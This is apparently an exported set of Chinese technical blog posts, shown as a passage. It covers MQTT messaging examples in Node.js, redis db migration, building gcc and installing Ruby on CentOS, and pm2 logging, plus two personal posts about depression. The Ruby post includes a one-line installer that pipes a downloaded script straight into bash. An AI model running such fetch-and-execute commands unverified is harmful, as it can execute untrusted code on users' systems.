style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.log(<span style=\"color: #66cccc;\">'mosca server running'</span>);\n}).on(<span style=\"color: #66cccc;\">'clientConnected'</span>, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">client</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.log(<span style=\"color: #66cccc;\">'client('</span> + client.id + <span style=\"color: #66cccc;\">') connected'</span>);\n}).on(<span style=\"color: #66cccc;\">'published'</span>, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">packet</span>, <span style=\"color: #ffcc66;\">client</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.log(<span style=\"color: #66cccc;\">'client('</span> + (client ? client.id : <span style=\"color: #66cccc;\">'internal'</span>) + <span style=\"color: #66cccc;\">') published top</span><span style=\"color: #66cccc; text-decoration: underline;\">ic('</span><span style=\"text-decoration: underline;\"> + packet.topic + </span><span style=\"color: #66cccc; text-decoration: underline;\">'): '</span><span style=\"text-decoration: underline;\"> + packet.payload);</span>\n}).on(<span style=\"color: #66cccc;\">'subscribed'</span>, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">topic</span>, <span style=\"color: #ffcc66;\">client</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.log(<span style=\"color: #66cccc;\">'client('</span> + client.id + <span style=\"color: #66cccc;\">') subscribed topic('</span> + topic + <span style=\"color: #66cccc;\">')'</span>);\n}).on(<span style=\"color: #66cccc;\">'unsubscribed'</span>, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">topic</span>, <span style=\"color: #ffcc66;\">client</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.log(<span style=\"color: #66cccc;\">'client('</span> + client.id + <span style=\"color: #66cccc;\">') unsubscribed topic('</span> + topic + <span style=\"color: #66cccc;\">')'</span>);\n}).on(<span style=\"color: #66cccc;\">'clientDisconnecting'</span>, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">client</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.log(<span style=\"color: #66cccc;\">'client('</span> + client.id + <span style=\"color: #66cccc;\">') disconnecting'</span>);\n}).on(<span style=\"color: #66cccc;\">'clientDisconnected'</span>, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">client</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.log(<span style=\"color: #66cccc;\">'client('</span> + client.id + <span style=\"color: #66cccc;\">') disconnected'</span>);\n});\n</pre>\n</div>\n\n<p>\n<code>client.js</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">mqtt</span> = require(<span style=\"color: #66cccc;\">'mqtt'</span>);\n\n\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">client</span> = mqtt.connect(<span style=\"color: #66cccc;\">'mqtt://127.0.0.1:1883'</span>);\nclient.on(<span style=\"color: #66cccc;\">'connect'</span>, <span style=\"color: #99cc99;\">function</span> () {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.subscribe(<span style=\"color: #66cccc;\">'presence'</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.publish(<span style=\"color: #66cccc;\">'presence'</span>, <span style=\"color: #66cccc;\">'a message from myself'</span>);\n}).on(<span style=\"color: #66cccc;\">'message'</span>, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">topic</span>, <span style=\"color: #ffcc66;\">message</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.log(topic + <span style=\"color: #66cccc;\">': '</span> + message.toString());\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.end();\n});\n</pre>\n</div>\n\n<p>\n运行 <code>server.js</code>\n</p>\n<pre class=\"example\">\n$ node server.js\nmosca server running\nclient(mqttjs_a423c0af) connected\nclient(internal) published topic($SYS/41TXEHPDe/new/clients): mqttjs_a423c0af\nclient(mqttjs_a423c0af) subscribed topic(presence)\nclient(internal) published topic($SYS/41TXEHPDe/new/subscribes): {\"clientId\":\"mqttjs_a423c0af\",\"topic\":\"presence\"}\nclient(mqttjs_a423c0af) published topic(presence): a message from myself\nclient(mqttjs_a423c0af) unsubscribed topic(presence)\nclient(mqttjs_a423c0af) disconnected\nclient(internal) published topic($SYS/41TXEHPDe/new/unsubscribes): {\"clientId\":\"mqttjs_a423c0af\",\"topic\":\"presence\"}\nclient(internal) published topic($SYS/41TXEHPDe/disconnect/clients): mqttjs_a423c0af\n</pre>\n\n<p>\n运行 <code>client.js</code>\n</p>\n<pre class=\"example\">\n$ node client.js\npresence: a message from myself\n$\n</pre>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">客户端与客户端通信</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li>客户端发送消息给另一个客户端\n\n<p>\n下面的例子演示了客户端通过约定的 <code>topic</code> 互相通信。\n</p>\n\n<p>\n<code>client_sub.js</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">mqtt</span> = require(<span style=\"color: #66cccc;\">'mqtt'</span>);\n\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">client</span> = mqtt.connect(<span style=\"color: #66cccc;\">'mqtt://127.0.0.1:1883'</span>);\nclient.on(<span style=\"color: #66cccc;\">'connect'</span>, <span style=\"color: #99cc99;\">function</span> () {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.publish(<span style=\"color: #66cccc;\">'sub'</span>, <span style=\"color: #66cccc;\">'message from pub'</span>);\n}).on(<span style=\"color: #66cccc;\">'message'</span>, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">topic</span>, <span style=\"color: #ffcc66;\">message</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.log(topic + <span style=\"color: #66cccc;\">': '</span> + message.toString());\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.end();\n});\n</pre>\n</div>\n\n<p>\n<code>client_pub.js</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">mqtt</span> = require(<span style=\"color: #66cccc;\">'mqtt'</span>);\n\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">client</span> = mqtt.connect(<span style=\"color: #66cccc;\">'mqtt://127.0.0.1:1883'</span>);\nclient.on(<span style=\"color: #66cccc;\">'connect'</span>, <span style=\"color: #99cc99;\">function</span> () {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.publish(<span style=\"color: #66cccc;\">'sub'</span>, <span style=\"color: #66cccc;\">'message from pub'</span>);\n}).on(<span style=\"color: #66cccc;\">'message'</span>, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">topic</span>, <span style=\"color: #ffcc66;\">message</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.log(topic + <span style=\"color: #66cccc;\">': '</span> + message.toString());\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.end();\n});\n</pre>\n</div>\n\n<p>\n运行 <code>server.js</code>\n</p>\n<pre class=\"example\">\n$ node server.js\nmosca server running\nclient(mqttjs_ebdc9fd4) connected\nclient(internal) published topic($SYS/4Jk9PBwDe/new/clients): mqttjs_ebdc9fd4\nclient(mqttjs_ebdc9fd4) subscribed topic(sub)\nclient(internal) published topic($SYS/4Jk9PBwDe/new/subscribes): {\"clientId\":\"mqttjs_ebdc9fd4\",\"topic\":\"sub\"}\nclient(mqttjs_ff000868) connected\nclient(internal) published topic($SYS/4Jk9PBwDe/new/clients): mqttjs_ff000868\nclient(mqttjs_ff000868) published topic(sub): message from pub\nclient(mqttjs_ebdc9fd4) unsubscribed topic(sub)\nclient(mqttjs_ebdc9fd4) disconnected\nclient(internal) published topic($SYS/4Jk9PBwDe/new/unsubscribes): {\"clientId\":\"mqttjs_ebdc9fd4\",\"topic\":\"sub\"}\nclient(internal) published topic($SYS/4Jk9PBwDe/disconnect/clients): mqttjs_ebdc9fd4\n</pre>\n\n<p>\n运行 <code>client_sub.js</code>\n</p>\n<pre class=\"example\">\n$ node client_sub.js\nsub: message from pub\n$\n</pre>\n\n<p>\n运行 <code>client_pub.js</code>\n</p>\n<pre class=\"example\">\n$ node client_pub.js\n</pre>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">客户端与客户端离线通信</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n离线通信需要同时满足以下条件\n</p>\n\n<ul class=\"org-ul\">\n<li>服务器配置持久存储\n</li>\n\n<li>订阅方启用会话状态\n\n<p>\n连接服务器时使用同样的 clientId 并指定 <code>clean</code> 为 <code>false</code>\n</p>\n</li>\n\n<li>发布方发布持久消息\n\n<p>\n发布消息时指定 <code>qos</code> 大于 <code>0</code> 以及 <code>retain</code> 为 <code>true</code>\n</p>\n</li>\n</ul>\n\n<p>\n下面的例子演示了客户端接收离线消息\n</p>\n\n<p>\n<code>client_sub.js</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">mqtt</span> = require(<span style=\"color: #66cccc;\">'mqtt'</span>);\n\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">client</span> = mqtt.connect(<span style=\"color: #66cccc;\">'mqtt://127.0.0.1:1883'</span>, {clientId: <span style=\"color: #66cccc;\">'sub'</span>, clean: <span style=\"color: #6699cc;\">fals</span><span style=\"color: #6699cc; text-decoration: underline;\">e</span><span style=\"text-decoration: underline;\">});</span>\nclient.on(<span style=\"color: #66cccc;\">'connect'</span>, <span style=\"color: #99cc99;\">function</span> () {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.subscribe(<span style=\"color: #66cccc;\">'sub'</span>);\n}).on(<span style=\"color: #66cccc;\">'message'</span>, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">topic</span>, <span style=\"color: #ffcc66;\">message</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.log(topic + <span style=\"color: #66cccc;\">': '</span> + message.toString());\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.end();\n});\n</pre>\n</div>\n\n<p>\n<code>client_pub.js</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">mqtt</span> = require(<span style=\"color: #66cccc;\">'mqtt'</span>);\n\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">client</span> = mqtt.connect(<span style=\"color: #66cccc;\">'mqtt://127.0.0.1:1883'</span>, {clientId: <span style=\"color: #66cccc;\">'pub'</span>});\nclient.on(<span style=\"color: #66cccc;\">'connect'</span>, <span style=\"color: #99cc99;\">function</span> () {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.publish(<span style=\"color: #66cccc;\">'sub'</span>, <span style=\"color: #66cccc;\">'message from pub'</span>, {qos: 1, retain: <span style=\"color: #6699cc;\">true</span>});\n}).on(<span style=\"color: #66cccc;\">'message'</span>, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">topic</span>, <span style=\"color: #ffcc66;\">message</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.log(topic + <span style=\"color: #66cccc;\">': '</span> + message.toString());\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.end();\n});\n</pre>\n</div>\n\n<p>\n运行 <code>srever.js</code>\n</p>\n<pre class=\"example\">\n$ node mqtt_server.js\nmosca server running\nclient(sub) connected\nclient(internal) published topic($SYS/V19OSVfix/new/clients): sub\nclient(sub) subscribed topic(sub)\nclient(internal) published topic($SYS/V19OSVfix/new/subscribes): {\"clientId\":\"sub\",\"topic\":\"sub\"}\nclient(sub) disconnected\nclient(internal) published topic($SYS/V19OSVfix/disconnect/clients): sub\nclient(pub) connected\nclient(internal) published topic($SYS/V19OSVfix/new/clients): pub\nclient(pub) published topic(sub): message from pub\nclient(sub) connected\nclient(internal) published topic($SYS/V19OSVfix/new/clients): sub\nclient(sub) subscribed topic(sub)\nclient(internal) published topic($SYS/V19OSVfix/new/subscribes): {\"clientId\":\"sub\",\"topic\":\"sub\"}\nclient(sub) disconnected\nclient(internal) published topic($SYS/V19OSVfix/disconnect/clients): sub\n</pre>\n\n<p>\n运行 <code>client_sub.js</code> 订阅消息后退出\n</p>\n<pre class=\"example\">\n$ node client_sub.js \nsub: message from pub\n$\n</pre>\n\n<p>\n运行 <code>client_pub.js</code> 发布消息\n</p>\n<pre class=\"example\">\n$ node mqtt_client_pub.js\n</pre>\n\n<p>\n运行 <code>client_sub.js</code> 接收离线消息后退出\n</p>\n<pre class=\"example\">\n$ node client_sub.js \nsub: message from pub\n$\n</pre>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n<a href=\"http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html\">MQTT Version 3.1.1</a>\n</p>\n\n<p>\n<a href=\"https://www.youtube.com/watch?v=WE7GVIFRV7Q\">Matteo Collina: \"MQTT\" and \"Node.js\"- Messaging the Internet of Things </a>\n</p>\n\n<p>\n<a href=\"http://thejackalofjavascript.com/getting-started-mqtt/\">Getting started with MQTT | The Jackal of Javascript</a></p>\n</div>\n</div>\n"
},
{
  "title": "我应该是中度抑郁症",
  "timestamp": "2016-01-07 16:44:00",
  "tags": [
    "心理"
  ],
  "body": "<p>\n一直怀疑自已有抑郁症，今天看了一下《走出抑郁的阴影：伯恩斯新情绪疗法》，根据里面提及的“贝克抑郁清单”进行了自测，结果为 <code>24分 中度抑郁</code> 。\n</p>\n\n<p>\n以前听到电视里提到绝大部分人都有心理疾病，我总是做心里点头默默飘过状，想不到自已也会中招。\n</p>\n\n<p>\n人或许就像是程序，上帝写出来的时候是完美的，只是成长过程中掺入了杂质，出现了 <code>BUG</code> ，我要开始 <code>DEBUG</code> 了。</p>\n"
},
{
  "title": "我的抑郁症的运行过程",
  "timestamp": "2016-01-09 18:11:00",
  "tags": [
    "心理"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">发病流程</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>从心里冒出的扭曲念头\n\n<p>\n有时候是无意中看到某个人引起，有时候是走神一会儿后突然从头脑中冒出。\n</p>\n</li>\n\n<li>觉得难受、揪心、屈辱\n\n<p>\n头脑有冲血堵塞的感觉，很难放松下来进行理性分析。\n</p>\n</li>\n\n<li>没有心情做事情\n\n<p>\n情感透支引起心力憔悴，心烦意乱没法做成事情。从道德上觉得自已不应该是这种状态，又觉得自已再努力去做，\n也可能被人拖后腿，自已的成果不会被认可，没有个人价值。事后觉得很内疚。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">习惯的力量</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n之前有看过《习惯的力量》，我觉得抑郁症就是一种心理的坏习惯，就算你发现了它，了解了它，克服它绝非一朝一夕，因为它是自发运行的，在你意识到它之前它可能已经运行了很久，对你的身心造成了很大的破坏。它就像是蚂蟥，它刚开始叮上你的时候，会稍微痛一下，等到它释放出麻醉效果，你就再也感觉不到它在吸你的血，甚至在往你身体里钻。抑郁症也会麻醉你的感知，让你默默长久承受心灵的痛苦，你习惯了这种痛苦，你又有抗拒改变的本能。就像是这个世界上难以戒除的各种瘾一样，抑郁症也是人生中要迈过的一道坎。</p>\n</div>\n</div>\n"
},
{
  "title": "迁移redis库的某个db",
  "timestamp": "2016-01-21 18:00:00",
  "tags": [
    "redis"
  ],
  "body": "<p>\n在项目开始的时候，往往会把各种用途的数据放到一个 redis 实例中，如 db1 存放功能 A 的数据、db2 存放功能 B 的数据。\n</p>\n\n<p>\n当 redis 的压力上来了之后，往往需要将某个 db 迁移到其它的实例上，如果是整个实例进行迁移，通常会通过 Master-Slave 将数据同步到新机器，然后提升新机器上的 redis 为 Master。\n</p>\n\n<p>\n但是遇到只需要迁移 1 个 db 的数据到新的 redis 实例（该实例已有其它数据）的情况，就需要借助 redis 数据迁移工具了，这里介绍两个工具。\n</p>\n\n<p>\n假设要将 redis 的 db5 从 192.168.1.100 上的 redis 迁到 192.168.1.101 上的 db5。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\"><a href=\"https://github.com/salimane/redis-tools\">redis-copy.py</a></h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n使用 python 开发。\n</p>\n\n<ul class=\"org-ul\">\n<li>安装\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo pip2 install redis\nwget https://github.com/salimane/redis-tools/raw/master/redis-copy.py\n</pre>\n</div>\n</li>\n\n<li>开始迁移\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">python2 ./redis-copy.py --source=192.168.1.100:6379 --target=192.168.1.101:6379 <span style=\"text-decoration: underline;\">--databases=5 --limit=1000000000</span>\npython2 ./redis-copy.py --source=192.168.1.100:6379 --target=192.168.1.101:6379 <span style=\"text-decoration: underline;\">--databases=5 --clean</span>\n</pre>\n</div>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\"><a href=\"https://github.com/yaauie/redis-copy\">redis-copy</a> （推荐）</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n使用 ruby 开发。\n</p>\n\n<ul class=\"org-ul\">\n<li>安装\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">gem install redis-copy\n</pre>\n</div>\n</li>\n\n<li>开始迁移\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">~/.gem/ruby/2.3.0/bin/redis-copy 192.168.1.100:6379/5 192.168.1.101:6379/5\n</pre>\n</div>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">比较</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n<a href=\"https://github.com/salimane/redis-tools\">redis-copy.py</a> 在迁移过程中 db 号不能改变，需要在源 db 中临时写入大量簿记信息，最终也没有完全清簿记信息（mig:run 键）。\n默认一次运行迁移 10000 条记录，可以多次运行迁移后面的数据，也可以通过指定 &#x2013;limit 为一个够大的数量一次性迁移。\n支持同时迁移多个 db 。\n</p>\n\n<p>\n<a href=\"https://github.com/yaauie/redis-copy\">redis-copy</a> 可以任意指定源、目的 db 号，不需要往 redis 写入簿记信息。</p>\n</div>\n</div>\n"
},
{
  "title": "CentOS 6.4 上编译安装 gcc 5.2.0",
  "timestamp": "2016-01-22 21:12:00",
  "tags": [
    "linux"
  ],
  "body": "<p>\nnode.js 4.x 的第三方扩展编译时要求 gcc 版本为 4.8，但是 CentOS 6.4 仓库里的版本为 4.4.7，\n在生产环境从第三方仓库里安装最新版 gcc 又不放心，还是自已从源代码编译安装吧。\n</p>\n\n<ul class=\"org-ul\">\n<li>下载 gcc 源代码\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">wget http://mirror.lzu.edu.cn/gnu/gcc/gcc-5.2.0/gcc-5.2.0.tar.bz2\ntar xjvf gcc-5.2.0.tar.bz2\n<span style=\"color: #cc99cc;\">cd</span> gcc-5.2.0\n</pre>\n</div>\n\n<p>\n官方的下载地址为 <a href=\"ftp://ftp.gnu.org/gnu/gcc/\">ftp://ftp.gnu.org/gnu/gcc/</a> ，使用国内镜像 <a href=\"http://mirror.lzu.edu.cn/gnu/gcc\">http://mirror.lzu.edu.cn/gnu/gcc</a> 快很多。\n</p>\n\n<p>\ngnu 中国的 <a href=\"https://www.gnu.org/prep/ftp.html\">镜像列表</a>\n</p>\n<blockquote>\n<p>\nAsia\n</p>\n\n<p>\nChina\n    <a href=\"http://mirror.hust.edu.cn/gnu/\">http://mirror.hust.edu.cn/gnu/</a>\n    <a href=\"http://mirrors.ustc.edu.cn/gnu/\">http://mirrors.ustc.edu.cn/gnu/</a>\n    <a href=\"ftp://mirrors.ustc.edu.cn/gnu/\">ftp://mirrors.ustc.edu.cn/gnu/</a>\n    rsync://mirrors.ustc.edu.cn/gnu/\n</p>\n</blockquote>\n</li>\n\n<li>安装依赖的包\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yum install gmp-devel mpfr-devel libmpc-devel\n</pre>\n</div>\n\n<p>\n参考自 INSTALL 目录下的文档。\n</p>\n</li>\n\n<li>编译安装\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">./configure --prefix=/opt/gcc-5.2.0 --disable-multilib &amp;&amp;<span style=\"color: #66cccc;\">\\</span>\nmake &amp;&amp;<span style=\"color: #66cccc;\">\\</span>\nmake -k check &amp;&amp;<span style=\"color: #66cccc;\">\\</span>\nmake install\n</pre>\n</div>\n\n<p>\n<code>--disable-multilib</code> 只编译 64 位。\n</p>\n\n<p>\n编译时间会耗时几个小时，这段时间最好去干点别的。\n</p>\n</li>\n\n<li>切换gcc版本\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">export</span> <span style=\"color: #ffcc66;\">PATH</span>=/opt/gcc-5.2.0/bin:$<span style=\"color: #ffcc66;\">PATH</span>\n</pre>\n</div>\n\n<p>\n或\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">export</span> <span style=\"color: #ffcc66;\">CC</span>=/opt/gcc-5.2.0/bin/gcc\n<span style=\"color: #cc99cc;\">export</span> <span style=\"color: #ffcc66;\">CPP</span>=/opt/gcc-5.2.0/bin/cpp\n<span style=\"color: #cc99cc;\">export</span> <span style=\"color: #ffcc66;\">CXX</span>=/opt/gcc-5.2.0/bin/c++\n</pre>\n</div>\n</li>\n\n<li>参考\n\n<p>\n<a href=\"http://superuser.com/questions/381160/how-to-install-gcc-4-7-x-4-8-x-on-centos\">yum - How to Install gcc 4.7.x/4.8.x on CentOS - Super User</a>\n</p>\n\n<p>\n<a href=\"https://wiki.mikejung.biz/Gcc_CentOS\">Gcc CentOS - How to compile gcc-4.8.2 on CentOS 6.6</a></p>\n</li>\n</ul>\n"
},
{
  "title": "CentOS 6.4 上安装 ruby 1.9.3",
  "timestamp": "2016-01-22 21:12:00",
  "tags": [
    "linux",
    "ruby"
  ],
  "body": "<p>\nCentOS 6.4 上仓库中的 Ruby 版本为 1.8.7 太旧了，<a href=\"https://github.com/yaauie/redis-copy\">redis-copy</a> 要求 Ruby 版本至少为 1.9.3。\n</p>\n\n<ul class=\"org-ul\">\n<li>安装 rvm\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">curl -L get.rvm.io | bash -s stable\n</pre>\n</div>\n</li>\n\n<li>安装 Ruby 1.9.3\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">/usr/local/rvm/bin/rvm install 1.9.3\n</pre>\n</div>\n\n<ul class=\"org-ul\">\n<li>启用 Ruby 1.9.3\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">source /usr/local/rvm/scripts/rvm\nrvm use 1.9.3\n</pre>\n</div>\n</li>\n\n<li>安装 RubyGems\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">rvm rubygems current\n</pre>\n</div>\n</li>\n\n<li>RubyGems 官方源国内访问不稳定，换成淘宝的镜像\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">gem sources --remove https://rubygems.org/\ngem sources -a https://ruby.taobao.org/\n</pre>\n</div>\n</li>\n\n<li>安装 <a href=\"https://github.com/yaauie/redis-copy\">redis-copy</a>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">gem install redis-copy\n</pre>\n</div>\n\n<p>\n安装后程序路径为 /usr/local/rvm/gems/ruby-1.9.3-p551/bin/redis-copy\n</p>\n\n<p>\n启用 Ruby 1.9.3 后，redis-copy 可以直接运行。\n</p>\n</li>\n</ul>\n</li>\n\n<li>参考\n\n<p>\n<a href=\"https://www.digitalocean.com/community/tutorials/how-to-install-ruby-on-rails-on-centos-6-with-rvm\">How To Install Ruby on Rails on CentOS 6 with RVM | DigitalOcean</a>\n</p>\n\n<p>\n<a href=\"https://ruby-china.org/topics/3705\">手把手安装RVM以及为什么RVM is not a function » Topics » Ruby China</a>\n</p>\n\n<p>\n<a href=\"http://www.jb51.net/article/49079.htm\">淘宝网提供的国内RubyGems镜像简介和使用方法_ruby专题_脚本之家</a></p>\n</li>\n</ul>\n"
},
{
  "title": "pm2的日志管理",
  "timestamp": "2016-02-17 14:16:00",
  "tags": [
    "node",
    "pm2"
  ],
  "body": "<p>\n<a href=\"https://github.com/Unitech/pm2\">pm2</a> 自身的日志文件 ~/.pm2/pm2.log，下面讲的是 <a href=\"https://github.com/Unitech/pm2\">pm2</a> app（应用）的日志文件。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">默认日志</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n每个 app（应用） 会生成 instances*2 （实例数×2）个日志文件。\n</p>\n\n<dl class=\"org-dl\">\n<dt> app 的标准输出日志文件 </dt><dd>~/.pm2/logs/&lt;app name&gt;-out-&lt;instance id&gt;.log\n</dd>\n\n<dt> app 的错误输出日志文件 </dt><dd>~/.pm2/logs/&lt;app name&gt;-error-&lt;instance id&gt;.log\n</dd>\n</dl>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">合并输出类型日志（-l）</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n每个 app（应用） 会生成 instances+1 （实例数+1）个日志文件。\n</p>\n\n<dl class=\"org-dl\">\n<dt> app 的日志文件 </dt><dd>~/.pm2/logs/&lt;app name&gt;-&lt;instance id&gt;.log\n</dd>\n</dl>\n\n<p>\n不影响默认日志。\n</p>\n\n<ul class=\"org-ul\">\n<li>可以指定合并输出类型的日志文件名（-l app.log）\n\n<p>\n输出日志文件名为 app-&lt;instance id&gt;.log\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">合并实例日志（&#x2013;merge-logs）</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n同一 app（应用）的所有 instances（实例）日志文件放在一起。\n</p>\n\n<dl class=\"org-dl\">\n<dt> app 的默认标准输出日志文件 </dt><dd>~/.pm2/logs/&lt;app name&gt;-out.log\n</dd>\n\n<dt> app 的默认错误输出日志文件 </dt><dd>~/.pm2/logs/&lt;app name&gt;-error.log\n</dd>\n\n<dt> app 的合并输出类型日志文件 </dt><dd>~/.pm2/logs/&lt;app name&gt;.log\n</dd>\n</dl>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">禁止默认日志</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<ul class=\"org-ul\">\n<li>禁止默认的标准输出日志文件（-o /dev/null）\n</li>\n\n<li>禁止默认的错误输出日志文件（-e /dev/null）\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">示例：app 生成一个日志文件简化日志管理</h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pm2 -n app -i 0 -l app.log -o /dev/null -e /dev/null --merge-logs start app.js\n</pre>\n</div>\n\n<p>\n这样只会生成一个日志文件 app.log。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-6\" class=\"outline-2\">\n<h2 id=\"sec-6\">定期清理日志</h2>\n<div class=\"outline-text-2\" id=\"text-6\">\n<p>\n不建议使用 <a href=\"https://www.npmjs.com/package/pm2-logrotate\">pm2-logrotate</a> ，太多问题了（详见： <a href=\"http://blog.kankanan.com/article/63a75236-pm2-768465e55fd765874ef659275c0f.html#sec-1\">控制pm2的日志文件大小</a> ）。\n</p>\n\n<p>\n还是使用 logrotate 服务靠谱（参考 <a href=\"http://pm2.keymetrics.io/docs/usage/log-management/#setting-up-a-native-logrotate\">Setting up a native logrotate</a> <a href=\"http://huoding.com/2013/04/21/246\">被遗忘的Logrotate | 火丁笔记</a>）：\n</p>\n\n<p>\n<code>/etc/logrotate.d/pm2-root</code>\n</p>\n<pre class=\"example\">\n/root/.pm2/pm2.log /root/.pm2/logs/*.log {\n    daily\n    size 1M\n    rotate 10\n    create 600 nobody nobody\n    missingok\n    notifempty\n    compress\n    sharedscripts\n    copytruncate\n}\n</pre>\n</div>\n</div>\n"
},
{
  "title": "git多人协作：维护干净的提交树",
  "timestamp": "2016-02-21 13:14:00",
  "tags": [
    "git"
  ],
